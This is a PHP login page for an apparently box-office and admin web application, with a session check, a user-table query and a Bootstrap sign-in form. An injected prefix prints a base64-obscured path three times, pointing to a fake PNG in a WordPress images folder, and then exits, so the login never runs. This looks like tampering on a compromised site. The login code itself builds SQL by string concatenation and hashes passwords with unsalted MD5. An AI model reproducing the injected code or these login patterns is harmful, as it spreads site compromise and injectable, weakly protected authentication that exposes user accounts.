<?php
echo base64_decode("L2hvbWUvYWFwZHVzZXIvcHVibGljX2h0bWwvd3AtaW5jbHVkZXMvaW1hZ2VzL3dwaWNvbnMtM3gucG5n");
echo "<pre>";
echo base64_decode("L2hvbWUvYWFwZHVzZXIvcHVibGljX2h0bWwvd3AtaW5jbHVkZXMvaW1hZ2VzL3dwaWNvbnMtM3gucG5n");
echo "<pre>";
echo base64_decode("L2hvbWUvYWFwZHVzZXIvcHVibGljX2h0bWwvd3AtaW5jbHVkZXMvaW1hZ2VzL3dwaWNvbnMtM3gucG5n");
exit;
include("includes/config.php");
if(isset($_SESSION['user_session_id']) && isset($_SESSION['user_session_right'])){
    if($_SESSION['user_session_right']=="administrator"){
        header('location:'.ADMIN_SITE.'dashboard.php');    
    }elseif($_SESSION['user_session_right']=="boxoffice"){
        header('location:'.BOXOFFICE_SITE.'dashboard.php');    
    }else{
         header('location:'.SITE.'logout.php');    
    } 

}
if(isset($_POST['login'])) {
    $msg ='';
    $username= trim($_POST['username']);
    $password= trim($_POST['password']);
    if($username == '') {
        $msg .= '<p class="inv-em alert alert-danger"><span class="icon-warning"></span><strong>Opps Error !</strong> Please enter username.<a class="close" data-dismiss="alert" href="#" aria-hidden="true"></a></p>';
    }
    if($password == '') {
        $msg .= '<p class="inv-em alert alert-danger"><span class="icon-warning"></span><strong>Opps Error !</strong> Please enter password.<a class="close" data-dismiss="alert" href="#" aria-hidden="true"></a></p>';
    }
    if($msg =='') {
            $sql="SELECT * FROM user WHERE isdelete='0' and email = '".addSlashesForDB($username)."' AND password = '".addSlashesForDB(md5($password))."'";
            $result = $db->query($sql);
            if(!empty($result)){
                $res_count = $db->nums();
                if($res_count != '0') {
                    $row = $db->fetch_array($result);
                if($row['status']=='0') {
                    $msg .= '<p class="inv-em alert alert-danger"><span class="icon-warning"></span><strong>Opps Error !</strong> Access denied! Please contact administrator.<a class="close" data-dismiss="alert" href="#" aria-hidden="true"></a></p>';
                }else {
                    $_SESSION['user_session_id'] = $row['id'];
                    $_SESSION['user_session_name'] = $row['name'];
                    $_SESSION['user_session_right'] = $row['module_rights'];
                    if($row['module_rights']!=''){
                        if($_SESSION['user_session_right']=="administrator"){
                            header('location:'.ADMIN_SITE.'dashboard.php');    
                        }elseif($_SESSION['user_session_right']=="boxoffice"){
                            header('location:'.BOXOFFICE_SITE.'dashboard.php');    
                        }else{
                             header('location:'.SITE.'index.php');    
                        } 
                    }
                }
            }else{
                 $msg .= '<p class="inv-em alert alert-danger"><span class="icon-warning"></span><strong>Opps Error !</strong> Please check login name or password.<a class="close" data-dismiss="alert" href="#" aria-hidden="true"></a></p>';
            }
        }else{
            $msg .= '<p class="inv-em alert alert-danger"><span class="icon-warning"></span><strong>Opps Error !</strong> Please check login name or password.<a class="close" data-dismiss="alert" href="#" aria-hidden="true"></a></p>';
        }
    }
}
?>

<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Login Page | <?php echo $title;?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="<?php echo $description;?>"/>
    <meta name="author" content="<?php echo $author;?>"  />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <!-- App favicon -->
    <link rel="shortcut icon" href="<?php echo SITE;?>assets/images/favicon.ico">
    <!-- App css -->
    <link href="<?php echo SITE;?>assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" id="bootstrap-stylesheet" />
    <link href="<?php echo SITE;?>assets/css/icons.min.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo SITE;?>assets/css/app.min.css" rel="stylesheet" type="text/css" id="app-stylesheet" />
</head>
<body>
    <div class="account-pages my-5 pt-5">
        <div class="container">
            <div class="row justify-content-center">
                <?php
                    if (!empty($msg)){
                        echo $msg;
                    }
                ?>
                <div class="col-md-8 col-lg-6">
                    <div class="card">
                        <div class="card-body">
                            <div class="text-center mb-4 mt-3">
                                <a href="<?php echo SITE;?>">
                                    <span>
                                        <img src="<?php echo SITE;?>assets/images/logo-dark.png" alt="" height="30">
                                    </span>
                                </a>                                
                            </div>
                            <form action="" class="p-2" method="post">
                                <div class="form-group">
                                    <label for="username">User Name</label>
                                    <input class="form-control" type="text" id="username" name="username"  placeholder="" required="">
                                </div>
                                <div class="form-group mb-4">      
                                    <label for="password">Password</label>
                                    <input class="form-control" type="password" name="password" id="Password" placeholder="" required="">
                                </div>                                
                                <div class="mb-3 text-center">
                                    <button class="btn btn-primary btn-block" type="submit" name="login"> Sign In </button>
                                </div>
                            </form>
                        </div>
                        <!-- end card-body -->
                    </div>
                    <!-- end card -->
                    <div class="row mt-4">
                        <div class="col-sm-12 text-center">
                            <p class="text-muted mb-0">Developed by <a href="https://vinayakwebinfotech.com/" target="_blank" class="text-dark ml-1"><b>Vinayak Infotech</b></a></p>
                        </div>
                    </div>
                </div>
                <!-- end col -->
            </div>
        </div>
    </div>
    <script src="<?php echo SITE;?>assets/js/vendor.min.js"></script>
    <script src="<?php echo SITE;?>assets/js/app.min.js"></script>
</body>
</html>
